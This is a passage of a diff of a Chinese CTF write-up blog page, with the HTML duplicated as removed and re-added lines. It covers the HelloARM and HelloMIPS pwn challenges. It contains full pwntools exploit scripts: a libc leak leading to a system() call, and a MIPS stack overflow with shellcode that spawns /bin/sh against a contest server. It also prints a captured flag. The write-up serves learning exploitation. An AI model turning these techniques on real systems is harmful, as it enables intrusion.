-    offset <span style="color:#f92672">+</span> int<span style="color:#f92672">.</span>from_bytes(addr_libc_write, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;little&#39;</span>))
-print(<span style="color:#e6db74">&#34;addr_libc_system: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(addr_libc_system[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>hex()))
 
-conn<span style="color:#f92672">.</span>send(addr_libc_system)
+conn<span style=color:#f92672>.</span>send(payload)
+conn<span style=color:#f92672>.</span>recv()
+addr_libc_write <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>recv(numb<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>)
 
-conn<span style="color:#f92672">.</span>interactive()
+print(<span style=color:#e6db74>&#34;addr_libc_write: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(addr_libc_write[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>hex()))
+addr_libc_system <span style=color:#f92672>=</span> p64(
+    offset <span style=color:#f92672>+</span> int<span style=color:#f92672>.</span>from_bytes(addr_libc_write, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;little&#39;</span>))
+print(<span style=color:#e6db74>&#34;addr_libc_system: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(addr_libc_system[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>hex()))
+
+conn<span style=color:#f92672>.</span>send(addr_libc_system)
+
+conn<span style=color:#f92672>.</span>interactive()
 </code></pre></div><p>执行后成功getshell：</p>
-<p><img src="/images/blog/66/image-20201019142513403.png" alt="image-20201019142513403"></p>
-<h2 id="hellomips">HelloMIPS</h2>
+<p><img src=/images/blog/66/image-20201019142513403.png alt=image-20201019142513403></p>
+<h2 id=hellomips>HelloMIPS</h2>
 <p>这题和arm的那题比较相似，也是ROP，但是比arm的简单一些，给的程序包含三个文件：</p>
-<pre tabindex="0"><code>Archive:  ./HelloMIPS-833e170bbe2429fe66aae530c279c67b.zip
+<pre tabindex=0><code>Archive:  ./HelloMIPS-833e170bbe2429fe66aae530c279c67b.zip
   Length      Date    Time    Name
 ---------  ---------- -----   ----
      7260  2020-10-03 14:52   HelloMIPS
@@ -527,11 +501,11 @@ conn<span style="color:#f92672">.</span>interactive()
 ---------                     -------
    588865                     4 files
 </code></pre><p>checksec看一下：</p>
-<p><img src="/images/blog/66/image-20201019142817343.png" alt="image-20201019142817343"></p>
+<p><img src=/images/blog/66/image-20201019142817343.png alt=image-20201019142817343></p>
 <p>是mipsel小端的程序，没有开任何的选项，那么这题很可能要在栈上执行代码了。</p>
 <p>先用qemu跑一下程序：</p>
-<pre tabindex="0"><code>qemu-mipsel -L ./ ./HelloMIPS
-</code></pre><p><img src="/images/blog/66/image-20201019143112985.png" alt="image-20201019143112985"></p>
+<pre tabindex=0><code>qemu-mipsel -L ./ ./HelloMIPS
+</code></pre><p><img src=/images/blog/66/image-20201019143112985.png alt=image-20201019143112985></p>
 <p>总的来说程序先要求一份输入，然后给出一个Magic number，之后会有一次输入，但是没有任何回显。</p>
 <p>启动ida来分析这个程序：</p>
 <p>程序和HelloARM的比较相似，但是main函数中没有buff，第一次读取的<code>0xF</code>个字节的内容被写入到bss段的<code>NAME</code>数组中。之后调用的<code>oooooo()</code>函数也存在缓冲区溢出，但是与ARM的汇编不同的是，存放返回地址的位置在缓冲区的上方，这使得我们可以直接劫持<code>oooooo()</code>的返回指令。</p>
@@ -543,91 +517,81 @@ conn<span style="color:#f92672">.</span>interactive()
 <li>bss上的代码主要是读取栈指针<code>$sp</code>并跳转到栈上的地址执行代码</li>
 <li>第二次输入时，需要在栈上填充代码，调用<code>system()</code>函数（它的地址就是给出的magic number的值），<code>/bin/sh</code>字符串可以放在栈上，但是要放在<code>$sp</code>指针的后面，否则在调用<code>system()</code>函数时会覆盖掉。</li>
 </ul>
-<p><img src="/images/blog/66/image-20201019144642666.png" alt="image-20201019144642666"></p>
+<p><img src=/images/blog/66/image-20201019144642666.png alt=image-20201019144642666></p>
 <p>完整代码如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> sys
-context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
-context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mips&#39;</span>
-Debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+<span style=color:#f92672>import</span> sys
+context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;debug&#39;</span>
+context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mips&#39;</span>
+Debug <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
 
-elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./HelloMIPS&#39;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+elf <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./HelloMIPS&#39;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
 
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_sh</span>(other_libc<span style="color:#f92672">=</span>null):
-    <span style="color:#75715e"># return process([&#34;qemu-mipsel&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloMIPS&#34;])</span>
-    <span style="color:#66d9ef">return</span> remote(<span style="color:#e6db74">&#39;10.104.255.211&#39;</span>, <span style="color:#ae81ff">7777</span>)
-    <span style="color:#66d9ef">global</span> libc
-    <span style="color:#66d9ef">if</span> args[<span style="color:#e6db74">&#39;REMOTE&#39;</span>]:
-        <span style="color:#66d9ef">if</span> other_libc <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> null:
-            libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
-        <span style="color:#66d9ef">return</span> remote(<span style="color:#e6db74">&#39;10.104.255.211&#39;</span>, <span style="color:#ae81ff">7777</span>)
-    <span style="color:#66d9ef">elif</span> Debug:
-        sh <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;qemu-mipsel&#34;</span>, <span style="color:#e6db74">&#34;-g&#34;</span>, <span style="color:#e6db74">&#34;2333&#34;</span>, <span style="color:#e6db74">&#34;-L&#34;</span>, <span style="color:#e6db74">&#34;./&#34;</span>, <span style="color:#e6db74">&#34;./HelloMIPS&#34;</span>])
-        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Please use GDB remote!(Enter to continue)&#39;</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_sh</span>(other_libc<span style=color:#f92672>=</span>null):
+    <span style=color:#75715e># return process([&#34;qemu-mipsel&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloMIPS&#34;])</span>
+    <span style=color:#66d9ef>return</span> remote(<span style=color:#e6db74>&#39;10.104.255.211&#39;</span>, <span style=color:#ae81ff>7777</span>)
+    <span style=color:#66d9ef>global</span> libc
+    <span style=color:#66d9ef>if</span> args[<span style=color:#e6db74>&#39;REMOTE&#39;</span>]:
+        <span style=color:#66d9ef>if</span> other_libc <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> null:
+            libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./&#34;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+        <span style=color:#66d9ef>return</span> remote(<span style=color:#e6db74>&#39;10.104.255.211&#39;</span>, <span style=color:#ae81ff>7777</span>)
+    <span style=color:#66d9ef>elif</span> Debug:
+        sh <span style=color:#f92672>=</span> process([<span style=color:#e6db74>&#34;qemu-mipsel&#34;</span>, <span style=color:#e6db74>&#34;-g&#34;</span>, <span style=color:#e6db74>&#34;2333&#34;</span>, <span style=color:#e6db74>&#34;-L&#34;</span>, <span style=color:#e6db74>&#34;./&#34;</span>, <span style=color:#e6db74>&#34;./HelloMIPS&#34;</span>])
+        log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#39;Please use GDB remote!(Enter to continue)&#39;</span>)
         raw_input()
-        <span style="color:#66d9ef">return</span> sh
-    <span style="color:#66d9ef">else</span>:
-        <span style="color:#66d9ef">return</span> process([<span style="color:#e6db74">&#34;qemu-mipsel&#34;</span>, <span style="color:#e6db74">&#34;-L&#34;</span>, <span style="color:#e6db74">&#34;./&#34;</span>, <span style="color:#e6db74">&#34;./HelloMIPS&#34;</span>])
+        <span style=color:#66d9ef>return</span> sh
+    <span style=color:#66d9ef>else</span>:
+        <span style=color:#66d9ef>return</span> process([<span style=color:#e6db74>&#34;qemu-mipsel&#34;</span>, <span style=color:#e6db74>&#34;-L&#34;</span>, <span style=color:#e6db74>&#34;./&#34;</span>, <span style=color:#e6db74>&#34;./HelloMIPS&#34;</span>])
 
 
-conn <span style="color:#f92672">=</span> get_sh()
-conn<span style="color:#f92672">.</span>recvline()
+conn <span style=color:#f92672>=</span> get_sh()
+conn<span style=color:#f92672>.</span>recvline()
 
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
-payload <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;addi $t9, $sp, -0x108&#39;</span>)
-payload <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;nop&#39;</span>)
-payload <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;jalr $t9&#39;</span>)
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0xF</span><span style="color:#f92672">-</span>len(payload))
+payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>
+payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;addi $t9, $sp, -0x108&#39;</span>)
+payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;nop&#39;</span>)
+payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;jalr $t9&#39;</span>)
+payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>0xF</span><span style=color:#f92672>-</span>len(payload))
 
 
-conn<span style="color:#f92672">.</span>send(payload)
-conn<span style="color:#f92672">.</span>recvline()
+conn<span style=color:#f92672>.</span>send(payload)
+conn<span style=color:#f92672>.</span>recvline()
 
-bb <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recvline()
+bb <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>recvline()
 
-hex_magic <span style="color:#f92672">=</span> bb[<span style="color:#ae81ff">15</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
-addr_magic <span style="color:#f92672">=</span> int(hex_magic, <span style="color:#ae81ff">16</span>)
-print(<span style="color:#e6db74">&#39;hex_magic: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hex_magic))
+hex_magic <span style=color:#f92672>=</span> bb[<span style=color:#ae81ff>15</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
+addr_magic <span style=color:#f92672>=</span> int(hex_magic, <span style=color:#ae81ff>16</span>)
+print(<span style=color:#e6db74>&#39;hex_magic: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format(hex_magic))
 
-addr_NAME <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x440E20</span>
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
-payload <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;move $a0, $sp&#39;</span>)
-payload <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;li $t9, &#39;</span> <span style="color:#f92672">+</span> hex(addr_magic))
-payload <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;nop&#39;</span>)
-payload <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;jalr $t9&#39;</span>)
-payload <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;nop&#39;</span>)
+addr_NAME <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x440E20</span>
+payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>
+payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;move $a0, $sp&#39;</span>)
+payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;li $t9, &#39;</span> <span style=color:#f92672>+</span> hex(addr_magic))
+payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;nop&#39;</span>)
+payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;jalr $t9&#39;</span>)
+payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;nop&#39;</span>)
 
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
-payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)
-payload <span style="color:#f92672">+=</span> p32(addr_NAME)
-<span style="color:#75715e"># 重要參數放到sp后面防止被冲掉！！！！！</span>
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
+payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>0x100</span> <span style=color:#f92672>-</span> len(payload))
+payload <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0xdeadbeef</span>)
+payload <span style=color:#f92672>+=</span> p32(addr_NAME)
+<span style=color:#75715e># 重要參數放到sp后面防止被冲掉！！！！！</span>
+payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>
 
-conn<span style="color:#f92672">.</span>send(payload)
+conn<span style=color:#f92672>.</span>send(payload)
 
-conn<span style="color:#f92672">.</span>interactive()
+conn<span style=color:#f92672>.</span>interactive()
 
-<span style="color:#75715e"># TSCTF{d561c9d2-064d-11eb-80ab-0242ac110002}</span>
-</code></pre></div><p><img src="/images/blog/66/image-20201019150313905.png" alt="image-20201019150313905"></p>
-
+<span style=color:#75715e># TSCTF{d561c9d2-064d-11eb-80ab-0242ac110002}</span>
+</code></pre></div><p><img src=/images/blog/66/image-20201019150313905.png alt=image-20201019150313905></p>
 </main>
-
-
-
-<div id="comments">
-    <hr>
-    <script src="https://utteranc.es/client.js" repo='KB5201314/KB5201314.github.io' issue-term="pathname" label='💬 comments 💬'
-        theme='github-light' crossorigin="anonymous" async>
-        </script>
+<div id=comments>
+<hr>
+<script src=https://utteranc.es/client.js repo=KB5201314/KB5201314.github.io issue-term=pathname label="💬 comments 💬" theme=github-light crossorigin=anonymous async></script>
 </div>
-
-
-  <footer>
-  
-  <hr/>
-  © imlk 2017 &ndash; 2021 | <a href="https://blog.imlk.top">imlk's blog</a> | <a href="https://github.com/KB5201314/">Github</a> | <a href="mailto:me@imlk.top">Email</a> | <a href="https://beian.miit.gov.cn/">京ICP备 - 2020042968号</a>
-  
-  </footer>
-  </body>
+<footer>
+<hr>
+© imlk 2017 &ndash; 2021 | <a href=https://blog.imlk.top>imlk's blog</a> | <a href=https://github.com/KB5201314/>Github</a> | <a href=mailto:me@imlk.top>Email</a> | <a href=https://beian.miit.gov.cn/>京ICP备 - 2020042968号</a>
+</footer>
+</body>
 </html>
